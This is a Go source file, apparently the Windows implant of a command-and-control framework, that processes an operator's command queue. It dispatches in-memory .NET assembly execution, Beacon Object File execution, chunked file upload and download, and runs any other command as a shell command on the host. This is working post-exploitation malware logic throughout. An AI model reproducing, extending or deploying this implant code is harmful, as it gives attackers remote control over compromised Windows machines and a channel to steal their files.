// server/docker/payloads/Windows/command_processor.go
//go:build windows
// +build windows

package main

import (
	"encoding/json"
	"fmt"
	"os"
	"strings"
	"time"
)

// ProcessNextCommand processes the next command in the queue
func (cq *CommandQueue) ProcessNextCommand() (*CommandResult, error) {
	cq.mu.Lock()
	if len(cq.commands) == 0 {
		cq.mu.Unlock()
		return nil, nil
	}

	cmd := cq.commands[0]
	cq.commands = cq.commands[1:]
	cq.mu.Unlock()

	// Add this diagnostic
	fmt.Fprintf(os.Stderr, "DIAGNOSTIC: Processing command type: %s\n", cmd.Command)
	if strings.Contains(fmt.Sprintf("%v", cmd), "command_id") {
		fmt.Fprintf(os.Stderr, "WARNING: Command struct would print as: %v\n", cmd)
	}

	// Set the current command in context
	cq.cmdContext.mu.Lock()
	cq.cmdContext.CurrentCommand = &cmd
	cq.cmdContext.mu.Unlock()

	// IMPORTANT: Apply session environment variables before executing any command
	cq.applySessionEnvironment()

	// IMPORTANT: Handle inline-assembly job management commands FIRST
	// These commands don't have data and should be processed before the data check
	if cmd.Command == "inline-assembly-jobs" {
		if handler, exists := cq.cmdRegistry["inline-assembly-jobs"]; exists {
			result := handler.Execute(cq.cmdContext, []string{})
			result.Command = cmd
			result.CompletedAt = time.Now().Format(time.RFC3339)
			return &result, nil
		} else {
			return &CommandResult{
				Command:     cmd,
				ErrorString: "inline-assembly-jobs command not registered",
				ExitCode:    1,
				CompletedAt: time.Now().Format(time.RFC3339),
			}, nil
		}
	}

	// Handle inline-assembly-jobs-clean command
	if strings.HasPrefix(cmd.Command, "inline-assembly-jobs-clean") {
		parts := strings.Fields(cmd.Command)
		if handler, exists := cq.cmdRegistry["inline-assembly-jobs-clean"]; exists {
			args := []string{}
			if len(parts) > 1 {
				args = parts[1:] // Pass the job ID if provided
			}
			result := handler.Execute(cq.cmdContext, args)
			result.Command = cmd
			result.CompletedAt = time.Now().Format(time.RFC3339)
			return &result, nil
		}
	}

	// Handle inline-assembly-jobs-stats command
	if cmd.Command == "inline-assembly-jobs-stats" {
		if handler, exists := cq.cmdRegistry["inline-assembly-jobs-stats"]; exists {
			result := handler.Execute(cq.cmdContext, []string{})
			result.Command = cmd
			result.CompletedAt = time.Now().Format(time.RFC3339)
			return &result, nil
		}
	}

	// Handle inline-assembly-output command WITH arguments
	if strings.HasPrefix(cmd.Command, "inline-assembly-output ") {
		fmt.Printf("DEBUG: Executing inline-assembly-output command with args\n")
		parts := strings.Fields(cmd.Command)
		if handler, exists := cq.cmdRegistry["inline-assembly-output"]; exists {
			args := []string{}
			if len(parts) > 1 {
				args = parts[1:] // Pass the job ID as argument
			}
			result := handler.Execute(cq.cmdContext, args)
			result.Command = cmd
			result.CompletedAt = time.Now().Format(time.RFC3339)
			return &result, nil
		}
	}

	// Handle inline-assembly-kill command WITH arguments
	if strings.HasPrefix(cmd.Command, "inline-assembly-kill ") {
		parts := strings.Fields(cmd.Command)
		if handler, exists := cq.cmdRegistry["inline-assembly-kill"]; exists {
			args := []string{}
			if len(parts) > 1 {
				args = parts[1:] // Pass the job ID as argument
			}
			result := handler.Execute(cq.cmdContext, args)
			result.Command = cmd
			result.CompletedAt = time.Now().Format(time.RFC3339)
			return &result, nil
		}
	}

	// NOW handle inline-assembly commands WITH data (actual assembly execution)
	if strings.HasPrefix(cmd.Command, "inline-assembly") && cmd.Data != "" {

		// Parse the JSON data to check if it's valid
		var testParse map[string]interface{}
		if err := json.Unmarshal([]byte(cmd.Data), &testParse); err != nil {
		} else {
		}

		// Determine if it's async or regular
		handlerName := "inline-assembly"
		if strings.Contains(cmd.Command, "async") {
			handlerName = "inline-assembly-async"
		}

		// Execute using the appropriate handler
		if handler, exists := cq.cmdRegistry[handlerName]; exists {
			result := handler.Execute(cq.cmdContext, []string{})
			result.Command = cmd
			result.CompletedAt = time.Now().Format(time.RFC3339)
			return &result, nil
		} else {
			return &CommandResult{
				Command:     cmd,
				ErrorString: fmt.Sprintf("%s handler not registered", handlerName),
				ExitCode:    1,
				CompletedAt: time.Now().Format(time.RFC3339),
			}, nil
		}
	}

	// Handle BOF async commands
	if strings.HasPrefix(cmd.Command, "bof-async") && cmd.Data != "" {

		// Parse the JSON data
		var bofConfig map[string]interface{}
		if err := json.Unmarshal([]byte(cmd.Data), &bofConfig); err != nil {
			// Fall back to treating it as raw BOF data for backwards compatibility
			result := cq.processBOFAsync(cmd)
			return &result, nil
		}

		// Extract the actual BOF data from the JSON
		if bofData, ok := bofConfig["bof_data"].(string); ok {
			cmd.Data = bofData // Replace with the actual BOF data
		}

		result := cq.processBOFAsync(cmd)
		return &result, nil
	}

	// Handle regular BOF commands
	if strings.HasPrefix(cmd.Command, "bof") && cmd.Data != "" {

		// Parse the JSON data
		var bofConfig map[string]interface{}
		if err := json.Unmarshal([]byte(cmd.Data), &bofConfig); err != nil {
			// Fall back to treating it as raw BOF data for backwards compatibility
			result := cq.processBOF(cmd)
			return &result, nil
		}

		// Extract the actual BOF data from the JSON
		if bofData, ok := bofConfig["bof_data"].(string); ok {
			cmd.Data = bofData // Replace with the actual BOF data
		}

		result := cq.processBOF(cmd)
		return &result, nil
	}

	// Handle upload chunks
	if cmd.Command == "upload" && cmd.Data != "" {
		result, err := HandleUploadChunk(cmd, cq.cmdContext)
		if err != nil {
			return &CommandResult{
				Command:     cmd,
				Error:       err,
				ErrorString: err.Error(),
				ExitCode:    1,
				CompletedAt: time.Now().Format(time.RFC3339),
			}, nil
		}
		return result, nil
	}

	// Handle download continuation
	if cmd.Filename != "" && cmd.CurrentChunk > 0 {

		cq.mu.Lock()
		downloadInfo, exists := cq.activeDownloads[cmd.Filename]
		cq.mu.Unlock()

		if !exists {
			return &CommandResult{
				Command:     cmd,
				Error:       fmt.Errorf("no active download found for %s", cmd.Filename),
				ErrorString: fmt.Sprintf("no active download found for %s", cmd.Filename),
				ExitCode:    1,
				CompletedAt: time.Now().Format(time.RFC3339),
			}, nil
		}

		if !downloadInfo.InProgress {
			return &CommandResult{
				Command:     cmd,
				Error:       fmt.Errorf("download for %s is no longer active", cmd.Filename),
				ErrorString: fmt.Sprintf("download for %s is no longer active", cmd.Filename),
				ExitCode:    1,
				CompletedAt: time.Now().Format(time.RFC3339),
			}, nil
		}

		result, err := GetNextFileChunk(downloadInfo.FilePath, cmd.CurrentChunk, cmd)
		if err != nil {
			return &CommandResult{
				Command:     cmd,
				Error:       err,
				ErrorString: err.Error(),
				ExitCode:    1,
				CompletedAt: time.Now().Format(time.RFC3339),
			}, nil
		}

		cq.UpdateDownloadProgress(cmd.Filename, cmd.CurrentChunk)

		return result, nil
	}

	// Parse command for everything else
	cmdType := cmd.Command
	var cmdArgs []string

	// For BOF commands and variants, handle them specially
	if strings.HasPrefix(cmdType, "bof") {
		parts := strings.Fields(cmd.Command)
		if len(parts) > 0 {
			cmdType = parts[0]
			cmdArgs = parts[1:]
		}
	} else {
		// Normal command processing
		// Special handling for download and upload commands to preserve spaces in file paths
		var args []string
		cmdLower := strings.ToLower(strings.TrimSpace(cmd.Command))

		if strings.HasPrefix(cmdLower, "download") {
			// Use special parsing for download that treats everything after "download" as one argument
			args = parseDownloadCommand(cmd.Command)
		} else if strings.HasPrefix(cmdLower, "upload") {
			// Use special parsing for upload that treats everything after "upload" as one argument
			args = parseUploadCommand(cmd.Command)
		} else {
			// Use improved general parser for all other commands
			args = parseCommandLine(cmd.Command)
		}

		if len(args) == 0 {
			return &CommandResult{
				Command:     cmd,
				Error:       fmt.Errorf("empty command"),
				ErrorString: "empty command",
				ExitCode:    1,
				CompletedAt: time.Now().Format(time.RFC3339),
			}, nil
		}
		cmdType = args[0]
		cmdArgs = args[1:]
	}


	// Look up command handler
	if handler, exists := cq.cmdRegistry[cmdType]; exists {
		result := handler.Execute(cq.cmdContext, cmdArgs)

		// For file operations (download/upload), preserve the data from the handler
		if (cmdType == "download" || cmdType == "upload") &&
			(result.Command.Filename != "" || result.Command.Data != "") {
			// The handler set file operation data, merge with original command metadata
			result.Command.CommandID = cmd.CommandID
			result.Command.CommandDBID = cmd.CommandDBID
			result.Command.AgentID = cmd.AgentID
			result.Command.Timestamp = cmd.Timestamp
			// Keep the file data from the handler (Filename, CurrentChunk, TotalChunks, Data)
		} else {
			// For non-file operations, use the original command
			result.Command = cmd
		}

		result.CompletedAt = time.Now().Format(time.RFC3339)
		return &result, nil
	}

	// If no handler found, try to execute as shell command
	output, err := executeShellCommand(cmd.Command)
	if err != nil {
		return &CommandResult{
			Command:     cmd,
			Output:      output,
			Error:       err,
			ErrorString: err.Error(),
			ExitCode:    1,
			CompletedAt: time.Now().Format(time.RFC3339),
		}, nil
	}

	return &CommandResult{
		Command:     cmd,
		Output:      output,
		ExitCode:    0,
		CompletedAt: time.Now().Format(time.RFC3339),
	}, nil
}
